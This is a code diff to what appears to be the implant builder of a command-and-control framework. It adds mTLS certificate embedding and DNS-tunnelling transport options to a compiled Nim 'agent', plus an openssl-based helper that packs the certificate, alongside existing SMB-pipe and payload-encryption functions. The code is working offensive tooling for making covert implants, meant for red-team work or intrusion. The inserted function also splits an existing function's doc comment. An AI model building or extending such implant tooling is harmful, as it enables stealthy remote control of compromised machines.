@@ -264,6 +264,21 @@ func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
 	if cfg.SMBPipe != "" {
 		args = append(args, fmt.Sprintf("-d:SMBPipe=%s", cfg.SMBPipe))
 	}
+	if cfg.Transport == "mtls" && cfg.AgentCertPEM != "" && cfg.AgentKeyPEM != "" {
+		pfxB64, err := pemToPFXBase64(cfg.AgentCertPEM, cfg.AgentKeyPEM)
+		if err != nil {
+			return "", fmt.Errorf("nim mtls pfx: %w", err)
+		}
+		args = append(args, fmt.Sprintf("-d:AgentPFX=%s", pfxB64))
+	}
+	if cfg.Transport == "dns" {
+		if cfg.DNSDomain != "" {
+			args = append(args, fmt.Sprintf("-d:DNSDomain=%s", cfg.DNSDomain))
+		}
+		if cfg.DNSServer != "" {
+			args = append(args, fmt.Sprintf("-d:DNSServer=%s", cfg.DNSServer))
+		}
+	}
 	args = append(args, "agent.nim")
 
 	cmd := exec.Command(nim, args...)
@@ -851,6 +866,35 @@ func EncryptPayload(binPath, method, outDir string) (encPath, stubPath string, e
 // ── helpers ───────────────────────────────────────────────────────────────────
 
 // mtlsToHTTPFallback derives a plain HTTP fallback URL from the mTLS server URL.
+// pemToPFXBase64 converts PEM cert+key to a PKCS12/PFX blob (base64-encoded).
+// Uses the system openssl binary — available on Kali and most Linux distros.
+func pemToPFXBase64(certPEM, keyPEM string) (string, error) {
+	dir, err := os.MkdirTemp("", "nim-mtls-*")
+	if err != nil {
+		return "", err
+	}
+	defer os.RemoveAll(dir)
+	certFile := filepath.Join(dir, "cert.pem")
+	keyFile  := filepath.Join(dir, "key.pem")
+	pfxFile  := filepath.Join(dir, "agent.pfx")
+	if err := os.WriteFile(certFile, []byte(certPEM), 0600); err != nil {
+		return "", err
+	}
+	if err := os.WriteFile(keyFile, []byte(keyPEM), 0600); err != nil {
+		return "", err
+	}
+	cmd := exec.Command("openssl", "pkcs12", "-export",
+		"-out", pfxFile, "-inkey", keyFile, "-in", certFile, "-passout", "pass:")
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("openssl pkcs12: %w: %s", err, out)
+	}
+	pfxData, err := os.ReadFile(pfxFile)
+	if err != nil {
+		return "", err
+	}
+	return base64.StdEncoding.EncodeToString(pfxData), nil
+}
+
 // It replaces "https://" with "http://" and port 8443 with 8080.
 func mtlsToHTTPFallback(serverURL string) string {
 	u := strings.Replace(serverURL, "https://", "http://", 1)
